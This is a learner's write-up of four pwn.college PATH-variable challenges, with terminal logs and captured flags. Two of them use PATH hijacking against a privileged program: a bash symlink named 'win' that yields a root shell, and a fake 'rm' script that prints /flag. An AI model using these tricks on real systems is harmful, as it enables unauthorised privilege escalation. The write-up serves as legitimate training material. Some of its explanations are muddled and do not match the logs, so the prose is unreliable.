**Pondering Path**

***1.The PATH variable***

In this challenge, there is a special shell variable, called PATH, that stores a bunch of directory paths in which the shell will search for programs corresponding to commands. On executing ```PATH=""``` command, we denote nothing to PATH which deletes the flag using rm command. Following this, we can run the command ```/challenge/run``` to get the flag. 

```
Connected!
hacker@path~the-path-variable:~$ PATH=""
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{Q0suH2tz-g0W3BcjEG1HQfrFUMk.dZzNwUDLwQDO0czW}
```

***2.Setting Path***

In this challenge, we first had to overwrite ```/challenge/more_commands/``` in the PATH. Then on running ```/challenge/run``` win was invoked which caught the flag.

```
Connected!
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
/challenge/run: line 4: win: command not found
It looks like that did not work... Did you set PATH correctly?
hacker@path~setting-path:~$ PATH=/challenge/more_commands/
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{cAJnwYBMN_6o--7eFELlwfwJjy8.dVzNyUDLwQDO0czW}
```

***3.Adding Commands***

As we have learned the echo command in Linux is a built-in command that allows users to display lines of text or strings that are passed as arguments. It is commonly used in shell scripts and batch files to output status text to the screen or a file. In this challenge, we had to overwrite PATH with the directory having win. On doing that, when ```/challenge/run``` command is executed win is invoked. Then we used the echo command on PATH. Further, I created an empty file called win. Then on running ```cat /flag```, I got the flag.

```
Connected!
hacker@path~adding-commands:~$ echo $PATH
/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~adding-commands:~$ ln -s /usr/bin/bash ./win
hacker@path~adding-commands:~$ PATH=/home/hacker:$PATH
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
root@path~adding-commands:~# echo $PATH
/home/hacker:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
root@path~adding-commands:~# touch win
root@path~adding-commands:~# cat /flag
pwn.college{00-uQ0LjDyL28VFunAAJmvsKasY.dZzNyUDLwQDO0czW}
```

***4.Hijacking Commands***

In this challenge, the flag will be deleted using the rm command so I created an empty file named rm, which will be invoked instead of the flag. I stored ```cat /flag``` in the rm file. I further, changed the permissions of the file to give executive access to everyone. This way when I ran the command ```/challenge/run```, I got the flag.

```
Connected!
hacker@path~hijacking-commands:~$ touch rm
hacker@path~hijacking-commands:~$ echo 'cat /flag'>rm
hacker@path~hijacking-commands:~$ PATH="/home/hacker:$PATH"
hacker@path~hijacking-commands:~$ chmod a+x rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{sSx13YbrNXaInGgkr8K9gtURFT5.ddzNyUDLwQDO0czW}
```
